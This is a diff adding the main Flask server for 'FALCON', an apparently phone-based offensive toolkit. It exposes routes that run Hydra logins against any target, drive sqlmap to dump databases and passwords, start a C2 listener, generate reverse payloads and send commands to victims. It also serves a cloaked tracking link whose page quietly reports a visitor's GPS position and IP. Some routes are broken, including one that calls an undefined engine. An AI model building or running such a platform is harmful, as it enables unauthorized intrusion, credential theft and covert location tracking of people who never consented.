@@ -1,0 +1,434 @@
+import os, json, subprocess, shutil, time, platform
+from datetime import datetime
+from flask import Flask, render_template, jsonify, request, session, redirect, url_for, render_template_string
+
+import config, auth, database
+from file_manager import list_files, upload_file, delete_file
+import hydra_modules
+from engines.hydra_engine import HydraEngine
+from engines.network_engine import NetworkEngine
+from engines.port_engine import PortEngine
+from engines.dns_engine import DnsEngine
+from engines.ip_tracker import IPTracker
+from engines.faris_engine import FarisEngine
+from engines.history_engine import HistoryEngine
+from engines.report_engine import ReportEngine
+from engines.stats_engine import StatsEngine
+from engines.discovery_engine import DiscoveryEngine
+from engines.sqlmap_engine import SqlmapEngine
+from engines.c2_engine import C2Engine
+from engines.bughunter_engine import BugHunterEngine
+from engines.crawler_engine import CrawlerEngine
+from engines.brain import BrainEngine
+from plugins.loader import PluginLoader
+
+app = Flask(__name__)
+app.secret_key = os.environ.get("FALCON_SECRET") or "FALCON-" + os.urandom(16).hex()
+database.init_db()
+
+@app.after_request
+def add_header(r):
+    r.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
+    return r
+
+# تهيئة المحركات
+hydra_engine = HydraEngine()
+network_engine = NetworkEngine()
+port_engine = PortEngine()
+dns_engine = DnsEngine()
+ip_tracker = IPTracker()
+faris_engine = FarisEngine()
+history_engine = HistoryEngine()
+report_engine = ReportEngine()
+stats_engine = StatsEngine()
+discovery_engine = DiscoveryEngine()
+sqlmap_engine = SqlmapEngine()
+c2_engine = C2Engine()
+bughunter_engine = BugHunterEngine()
+crawler_engine = CrawlerEngine()
+brain_engine = BrainEngine()
+plugin_loader = PluginLoader()
+plugin_loader.load_all()
+
+# ================= Auth =================
+@app.route("/login", methods=["GET", "POST"])
+def login_page():
+    error = ""
+    if request.method == "POST":
+        pwd = request.form.get("password", "")
+        if auth.check_password(pwd):
+            session["authenticated"] = True
+            session["last_activity"] = time.time()
+            return redirect(url_for("dashboard"))
+        error = "كلمة المرور غير صحيحة"
+    if not auth.is_configured():
+        return "FALCON غير مُهيأ. شغّل: python3 setup_password.py", 503
+    return render_template_string(auth.LOGIN_HTML, error=error)
+
+@app.route("/logout")
+def logout_page():
+    session.clear()
+    return redirect(url_for("login_page"))
+
+# ================= Pages =================
+@app.route("/")
+@auth.login_required
+def dashboard(): return render_template("dashboard.html")
+
+@app.route("/network")
+@auth.login_required
+def page_network(): return render_template("network.html")
+
+@app.route("/hydra")
+@auth.login_required
+def page_hydra(): return render_template("hydra.html")
+
+@app.route("/iptracker")
+@auth.login_required
+def page_iptracker(): return render_template("iptracker.html")
+
+@app.route("/ports")
+@auth.login_required
+def page_ports(): return render_template("ports.html")
+
+@app.route("/reports")
+@auth.login_required
+def page_reports(): return render_template("reports.html")
+
+@app.route("/history")
+@auth.login_required
+def page_history(): return render_template("history.html")
+
+@app.route("/files")
+@auth.login_required
+def page_files(): return render_template("files.html")
+
+@app.route("/settings")
+@auth.login_required
+def page_settings(): return render_template("settings.html")
+
+@app.route("/payload")
+@auth.login_required
+def page_payload(): return render_template("payload.html")
+
+@app.route("/c2")
+@auth.login_required
+def page_c2(): return render_template("c2.html")
+
+@app.route("/sigint")
+@auth.login_required
+def page_sigint(): return render_template("sigint.html")
+
+@app.route("/sqli")
+@auth.login_required
+def page_sqli(): return render_template("sqli.html")
+
+# ================= API: Hydra =================
+@app.route("/api/hydra")
+@auth.login_required
+def api_hydra():
+    path = shutil.which("hydra")
+    if not path: return jsonify({"installed": False, "message": "غير مثبتة"})
+    try:
+        r = subprocess.run([path, "-h"], capture_output=True, text=True, timeout=5)
+        out = (r.stdout + "\n" + r.stderr).strip()
+        version = next((l.strip() for l in out.splitlines() if "Hydra" in l), "غير معروف")
+        return jsonify({"installed": True, "path": path, "version": version})
+    except Exception as e:
+        return jsonify({"installed": True, "message": str(e)})
+
+@app.route("/api/hydra/modules")
+@auth.login_required
+def api_hydra_modules(): return jsonify(hydra_engine.discover_modules())
+
+@app.route("/api/hydra/module")
+@auth.login_required
+def api_hydra_module():
+    return jsonify(hydra_modules.module_info(request.args.get("name", "")))
+
+@app.route("/api/hydra/run", methods=["POST"])
+@auth.login_required
+def api_hydra_run():
+    data = request.json or {}
+    target = data.get("target", "").strip()
+    service = data.get("service", "ssh").strip()
+    user = data.get("user", "").strip()
+    password = data.get("password", "").strip()
+    if not target: return jsonify({"success": False, "message": "أدخل الهدف"})
+    path = shutil.which("hydra")
+    if not path: return jsonify({"success": False, "message": "Hydra غير مثبتة"})
+    cmd = [path, "-I"]
+    if user: cmd.extend(["-l", user])
+    if password: cmd.extend(["-p", password])
+    cmd.extend([service + "://" + target])
+    try:
+        r = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
+        return jsonify({"success": True, "output": (r.stdout + "\n" + r.stderr).strip()})
+    except Exception as e:
+        return jsonify({"success": False, "message": str(e)})
+
+# ================= API: Network & Ports =================
+@app.route("/api/wifi")
+@auth.login_required
+def api_wifi(): return jsonify(network_engine.scan_wifi())
+
+@app.route("/api/arp")
+@auth.login_required
+def api_arp(): return jsonify(network_engine.arp_scan())
+
+@app.route("/api/ports")
+@auth.login_required
+def api_ports():
+    host = request.args.get("host", "").strip()
+    stype = request.args.get("type", "fast")
+    if not host: return jsonify({"success": False, "message": "أدخل host"}), 400
+    return jsonify(port_engine.scan(host, aggressive=(stype=="aggressive")))
+
+@app.route("/api/discover")
+@auth.login_required
+def api_discover(): return jsonify(discovery_engine.discover_subnet(request.args.get("cidr", "").strip()))
+
+@app.route("/api/banner")
+@auth.login_required
+def api_banner(): return jsonify(discovery_engine.grab_banner(request.args.get("ip"), int(request.args.get("port"))))
+
+@app.route("/api/sqli/scan")
+@auth.login_required
+def api_sqli_scan():
+    url = request.args.get("url", "").strip()
+    level = request.args.get("level", "1")
+    action = request.args.get("action", "scan") # scan, tables, dump, passwords, dbs
+    return jsonify(sqlmap_engine.scan(url, level, action))
+
+# ================= API: IP Tracker =================
+@app.route("/api/ip")
+@auth.login_required
+def api_ip(): return jsonify(ip_tracker.lookup(request.args.get("ip", "").strip()))
+
+# ================= API: Files & Reports =================
+@app.route("/api/files", methods=["GET"])
+@auth.login_required
+def api_files(): return jsonify(list_files())
+
+@app.route("/api/files", methods=["POST"])
+@auth.login_required
+def api_upload():
+    res, st = upload_file(request.files.get("file"))
+    return jsonify(res), st
+
+@app.route("/api/files/<name>", methods=["DELETE"])
+@auth.login_required
+def api_delete(name):
+    res, st = delete_file(name)
+    return jsonify(res), st
+
+@app.route("/api/report")
+@auth.login_required
+def api_report(): return jsonify(report_engine.json_report())
+
+@app.route("/api/stats")
+@auth.login_required
+def api_stats(): return jsonify(database.stats())
+
+@app.route("/api/history")
+@auth.login_required
+def api_history(): return jsonify(history_engine.list())
+
+@app.route("/api/config")
+@auth.login_required
+def api_config(): return jsonify(config.load())
+
+@app.route("/api/plugins")
+@auth.login_required
+def api_plugins(): return jsonify(plugin_loader.list_info())
+
+@app.route("/api/system")
+@auth.login_required
+def api_system():
+    return jsonify({"python": platform.python_version(), "hydra": bool(shutil.which("hydra"))})
+
+# ================= API: SIGINT & Link Tracker =================
+@app.route("/api/sigint/analyze")
+@auth.login_required
+def api_sigint_analyze():
+    # نستخدم محرك الشبكة لجلب معلومات الشبكة فقط
+    return jsonify({"success": True, "status": "النظام يمنع قراءة الأبراج في أندرويد 14. استخدم تتبع الروابط.", "total": 0, "network": {}, "towers": []})
+
+@app.route("/api/link/generate", methods=["POST"])
+@auth.login_required
+def api_link_generate():
+    import uuid, sqlite3
+    link_id = str(uuid.uuid4())[:8]
+    db = os.path.join(os.path.expanduser("~/FALCON"), "data", "falcon.db")
+    conn = sqlite3.connect(db)
+    conn.execute("INSERT INTO link_tracker (id, created, ip, lat, lon, user_agent) VALUES (?,?,?,?,?,?)",
+                 (link_id, datetime.now().isoformat(), "pending", "pending", "pending", "pending"))
+    conn.commit(); conn.close()
+    return jsonify({"success": True, "link": request.host_url + "t/" + link_id, "cloaked": request.host_url + "c/" + link_id})
+
+@app.route("/t/<link_id>", methods=["GET"])
+def link_target(link_id):
+    return f"""<!DOCTYPE html><html><head><script>
+    if (navigator.geolocation) {{
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {{ fetch("/api/link/catch?link_id={link_id}&lat=" + pos.coords.latitude + "&lon=" + pos.coords.longitude); document.body.innerHTML='<h2>شكراً لك</h2>'; }},
+            (err) => {{ fetch("/api/link/catch?link_id={link_id}&lat=denied&lon=denied"); document.body.innerHTML='<h2>يجب السماح بالموقع</h2>'; }}
+        );
+    }}</script></head><body style="background:#07111f;color:white;text-align:center;padding:50px;font-family:Arial"><h3>Loading...</h3></body></html>"""
+
+@app.route("/api/link/catch")
+def api_link_catch():
+    import sqlite3
+    db = os.path.join(os.path.expanduser("~/FALCON"), "data", "falcon.db")
+    conn = sqlite3.connect(db)
+    conn.execute("UPDATE link_tracker SET ip=?, lat=?, lon=? WHERE id=?", (request.remote_addr, request.args.get("lat"), request.args.get("lon"), request.args.get("link_id")))
+    conn.commit(); conn.close()
+    return jsonify({"status": "ok"})
+
+@app.route("/api/link/results")
+@auth.login_required
+def api_link_results():
+    import sqlite3
+    db = os.path.join(os.path.expanduser("~/FALCON"), "data", "falcon.db")
+    conn = sqlite3.connect(db); conn.row_factory = sqlite3.Row
+    rows = conn.execute("SELECT * FROM link_tracker ORDER BY created DESC LIMIT 20").fetchall()
+    conn.close()
+    return jsonify([dict(r) for r in rows])
+
+# ================= API: C2 (الفارس) =================
+@app.route("/api/c2/status")
+@auth.login_required
+def api_c2_status(): return jsonify(c2_engine.status())
+
+@app.route("/api/c2/start", methods=["POST"])
+@auth.login_required
+def api_c2_start(): return jsonify(c2_engine.start_server(request.json.get("port", 4444)))
+
+@app.route("/api/c2/stop", methods=["POST"])
+@auth.login_required
+def api_c2_stop(): return jsonify(c2_engine.stop_server())
+
+@app.route("/api/c2/generate", methods=["POST"])
+@auth.login_required
+def api_c2_generate():
+    data = request.json
+    return jsonify(c2_engine.generate_payload(data.get("lhost"), data.get("lport")))
+
+@app.route("/api/c2/cmd", methods=["POST"])
+@auth.login_required
+def api_c2_cmd():
+    data = request.json
+    return jsonify(c2_engine.send_command(data.get("cmd")))
+
+
+@app.route("/bughunter")
+@auth.login_required
+def page_bughunter(): return render_template("bughunter.html")
+
+@app.route("/api/bughunter/scan")
+@auth.login_required
+def api_bughunter_scan(): return jsonify(bughunter_engine.scan(request.args.get("url", "").strip()))
+
+
+@app.route("/api/crawler")
+@auth.login_required
+def api_crawler():
+    url = request.args.get("url", "").strip()
+    depth = int(request.args.get("depth", 2))
+    return jsonify(crawler_engine.crawl(url, depth))
+
+
+@app.route("/api/ai/chat", methods=["POST"])
+@auth.login_required
+def api_ai_chat():
+    data = request.json or {}
+    text = data.get("text", "").strip()
+    if not text: return jsonify({"reply": "أدخل أمراً."})
+    return jsonify(brain_engine.process_command(text))
+    return jsonify(commander_engine.process_command(text))
+
+
+@app.route("/api/system/health")
+@auth.login_required
+def api_system_health():
+    import shutil, os
+    issues = []
+    if not shutil.which("hydra"): issues.append("Hydra مفقودة")
+    if not shutil.which("nmap"): issues.append("Nmap مفقود")
+    if not os.path.exists("data/falcon.db"): issues.append("قاعدة البيانات مفقودة")
+    
+    # فحص الصفحات (إذا كنا في نفس السيرفر)
+    try:
+        import urllib.request
+        urllib.request.urlopen("http://127.0.0.1:5000/", timeout=2)
+    except:
+        issues.append("الخادم لا يستجيب")
+        
+    return jsonify({"health": len(issues) == 0, "issues": issues})
+
+
+@app.route("/api/ai/voice", methods=["POST"])
+@auth.login_required
+def api_ai_voice():
+    # Termux-api يتطلب تسجيل صوتي، لكننا سنستخدم المتصفح للتحويل النصي
+    # هذه الواجهة تستقبل النص (من تحويل الصوت في المتصفح) وتعطيه للعراب
+    data = request.json or {}
+    text = data.get("text", "").strip()
+    if not text: return jsonify({"reply": "لم أسمع شيئاً."})
+    return jsonify(commander_engine.process_command(text))
+
+
+@app.route("/livemap")
+@auth.login_required
+def page_livemap(): return render_template("livemap.html")
+
+@app.route("/api/livemap/scan")
+@auth.login_required
+def api_livemap_scan():
+    try:
+        import subprocess, json, socket
+        # 1. جلب الشبكات
+        res = subprocess.run(["termux-wifi-scaninfo"], capture_output=True, text=True, timeout=15)
+        if res.returncode != 0: return jsonify({"success": False, "message": "فشل المسح"})
+        networks = json.loads(res.stdout)
+        
+        # 2. جلب الـ IP الحالي للهاتف (إذا كان متصلاً بالواي فاي)
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            current_ip = s.getsockname()[0]
+            s.close()
+            # افتراض أن الـ Gateway (الراوتر) هو نفس أول 3 أجزاء + .1
+            gateway_ip = ".".join(current_ip.split(".")[:3]) + ".1"
+        except:
+            current_ip = "غير متصل"
+            gateway_ip = "غير معروف"
+
+        devices = []
+        for net in networks:
+            ssid = net.get("ssid", "مخفية") or "مخفية"
+            bssid = net.get("bssid", "غير معروف")
+            caps = net.get("capabilities", "")
+            security = "مفتوحة 🔓" if "[WPA" not in caps and "[WEP" not in caps else "محمية 🔒"
+            
+            # فحص سريع للثغرات (كمثال: إذا كانت مفتوحة، نعتبرها ثغرة، ونضيف ملاحظة)
+            vuln = "لا توجد ثغرات واضحة"
+            if security == "مفتوحة 🔓":
+                vuln = "⚠️ شبكة غير مشفرة (ثغرة أمنية)."
+                
+            devices.append({
+                "ssid": ssid,
+                "bssid": bssid,
+                "signal": net.get("rssi", 0),
+                "security": security,
+                "ip": current_ip if ssid == "مخفية" else "استخدم IP: " + current_ip,
+                "vuln": vuln
+            })
+            
+        return jsonify({"success": True, "count": len(devices), "devices": devices})
+    except Exception as e:
+        return jsonify({"success": False, "message": str(e)})
+
+if __name__ == "__main__":
+    print("✅ FALCON FINAL VERSION RUNNING")
+    app.run(host="127.0.0.1", port=5000, threaded=True, use_reloader=False)
